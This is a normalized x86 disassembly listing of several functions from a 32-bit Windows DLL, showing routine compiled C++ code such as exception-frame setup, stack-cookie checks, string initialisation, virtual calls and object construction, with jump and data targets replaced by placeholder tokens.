mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x60 ] 0x1
test ecx ecx
je r-xdata
mov [ esp + 0x60 ] 0x0
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_100225b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fe33
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x58 ] 0x0
lea ecx [ esp + 0x30 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x1c ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x44 ] 0xf
mov eax esi
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ esp + 0x17 ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test eax eax
je r-xdata
movzx eax [ esp + 0x17 ]
lea ecx [ esp + 0x17 ]
mov [ esp + 0x18 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test eax eax
je r-xdata
movzx ebx [ esp + 0x17 ]
push 0x58
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x24 ] edi
mov [ esp + 0x58 ] 0x1
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x48 ]
mov esi esp
mov [ esp + 0x44 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x58 ] esp
push eax
call sub_10003600
mov [ esp + 0x88 ] 0x2
mov [ esp + 0x88 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x70 ] 0x3
push 0x1
push ebx
push [ esp + 0x40 ]
push [ esp + 0x40 ]
push [ esp + 0x40 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x8c ] 0x1
mov ecx edi
call sub_1001f1b0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x58 ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x44 ] 0x10
jb r-xdata
sub_10022770
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
push 0x1
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_1001f4b0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_100228f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x13 ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
movzx eax [ esp + 0x2b ]
push 0x1
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_1001f790
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
je r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
sub_10022a70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_1001fa70
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_10022b00
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
mov eax [ esi ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
jne r-xdata
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
push 0x1
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_1001fc70
mov ecx eax
jmp r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
xor esi esi
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
jne r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10022c80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fedd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x7c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x84 ] 0x0
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x98 ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x54 ] 0xf
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x98 ] 0x1
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x6c ] 0x0
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x98 ] 0x2
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x98 ] 0x3
lea ecx [ esp + 0x70 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x40 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x98 ] 0x1
cmp [ esp + 0x6c ] 0x10
jb r-xdata
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x58 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x6c ] 0xf
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x98 ] 0x0
cmp [ esp + 0x54 ] 0x10
jb r-xdata
push [ esp + 0x58 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x54 ] 0xf
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x98 ] 0xffffffff
cmp [ esp + 0x84 ] 0x10
jb r-xdata
push [ esp + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x84 ] 0xf
mov eax esi
mov [ esp + 0x80 ] 0x0
mov [ esp + 0x70 ] 0x0
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x7c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x70 ]
call j_sub_1003f3e3#2
add esp 0x4
push 0x98
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x20 ] edi
mov [ esp + 0x98 ] 0x4
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x40 ]
mov esi esp
mov [ esp + 0x3c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push eax
call sub_10003600
mov [ esp + 0xc8 ] 0x5
mov [ esp + 0xc8 ] 0x4
mov ecx esi
call sub_1003c240
mov [ esp + 0xc8 ] 0x6
mov esi esp
mov [ esp + 0x48 ] esp
lea eax [ esp + 0x88 ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x5c ] esp
push eax
call sub_10003600
mov [ esp + 0xe0 ] 0x7
mov [ esp + 0xe0 ] 0x6
mov ecx esi
call sub_1003c240
mov [ esp + 0xe0 ] 0x8
mov esi esp
mov [ esp + 0x5c ] esp
lea eax [ esp + 0x88 ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x6c ] esp
push eax
call sub_10003600
mov [ esp + 0xf8 ] 0x9
mov [ esp + 0xf8 ] 0x8
mov ecx esi
call sub_1003c240
mov [ esp + 0xf8 ] 0xa
mov esi esp
mov [ esp + 0x6c ] esp
lea eax [ esp + 0xd0 ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x94 ] esp
push eax
call sub_10003600
mov [ esp + 0x110 ] 0xb
mov [ esp + 0x110 ] 0xa
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0xf8 ] 0xc
push 0x1
push [ esp + 0x74 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x108 ] 0x4
mov ecx edi
call sub_1001ff50
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x98 ] 0x3
test ecx ecx
je r-xdata
mov [ esp + 0x98 ] 0x2
cmp [ esp + 0x3c ] 0x10
jb r-xdata
sub_10023030
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ff4b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x54 ] 0xf
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x68 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x68 ] 0x1
lea ecx [ esp + 0x40 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor esi esi
mov eax [ esi ]
lea ecx [ esp + 0x28 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
mov [ esp + 0x3c ] 0xf
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x68 ] 0xffffffff
cmp [ esp + 0x54 ] 0x10
jb r-xdata
push [ esp + 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0x54 ] 0xf
mov eax esi
mov [ esp + 0x50 ] 0x0
mov [ esp + 0x40 ] 0x0
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x4c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
push [ esp + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
test eax eax
je r-xdata
push 0x68
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x24 ] edi
mov [ esp + 0x68 ] 0x2
test edi edi
je r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x40 ]
mov esi esp
mov [ esp + 0x34 ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x44 ] esp
push eax
call sub_10003600
mov [ esp + 0x98 ] 0x3
mov [ esp + 0x98 ] 0x2
mov ecx esi
call sub_1003c240
mov [ esp + 0x98 ] 0x4
mov esi esp
mov [ esp + 0x44 ] esp
lea eax [ esp + 0x70 ]
sub esp 0x18
mov ecx esp
mov [ esp + 0x68 ] esp
push eax
call sub_10003600
mov [ esp + 0xb0 ] 0x5
mov [ esp + 0xb0 ] 0x4
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x98 ] 0x6
push 0x1
push [ esp + 0x4c ]
push [ esp + 0x48 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0xac ] 0x2
mov ecx edi
call sub_100203c0
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
jmp r-xdata
mov [ esp + 0x68 ] 0x1
test ecx ecx
je r-xdata
mov [ esp + 0x68 ] 0x0
cmp [ esp + 0x3c ] 0x10
jb r-xdata
sub_10023260
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_10020730
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_100232f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004fb3b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x30
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ecx ecx
push ecx
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_10020930
mov ecx eax
jmp r-xdata
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
add eax ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test ecx ecx
jne r-xdata
sub_10023380
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
jne r-xdata
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
push 0x1
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_10020b30
mov ecx eax
jmp r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
xor esi esi
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
jne r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10023500
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd73
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x10 ]
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
mov eax [ esi ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x48 ] 0x0
lea ecx [ esp + 0x20 ]
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
jne r-xdata
push 0x50
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ esp + 0x1c ] edi
mov [ esp + 0x48 ] 0x1
test edi edi
je r-xdata
xor esi esi
jmp r-xdata
xor ecx ecx
sub esp 0x18
lea eax [ esp + 0x38 ]
mov esi esp
mov [ esp + 0x2c ] esp
sub esp 0x18
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0x78 ] 0x2
mov [ esp + 0x78 ] 0x1
mov ecx esi
call sub_1003c240
add esp 0x18
mov [ esp + 0x60 ] 0x3
push 0x1
push [ esp + 0x2c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov [ esp + 0x70 ] 0x1
mov ecx edi
call sub_10020e10
mov ecx eax
jmp r-xdata
mov [ esp + 0x48 ] 0xffffffff
cmp [ esp + 0x34 ] 0x10
jb r-xdata
mov eax [ ecx ]
mov esi [ eax + 0x8 ]
add esi ecx
xor esi esi
jmp r-xdata
mov [ esp + 0x48 ] 0x0
test ecx ecx
jne r-xdata
mov [ esp + 0x34 ] 0xf
mov eax esi
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10023a60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ffcd
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x2c ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edi - 0x4 ] eax
mov [ edi + 0x1c ] 0xf
mov [ edi + 0x18 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x4
lea esi [ edi + 0x20 ]
mov eax [ edi ]
push 0x0
push 0x0
mov [ ebp - 0x18 ] esi
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + edi - 0x4 ] eax
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_10019b80
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10023b50
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x2c ]
lea ecx [ edi + 0x2c ]
call sub_10023b80
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x2c ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10023b80
push ebp
mov ebp esp
push 0xffffffff
push sub_10050021
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x2c ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x2c ] r--data
mov eax [ ecx - 0x2c ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x2c ]
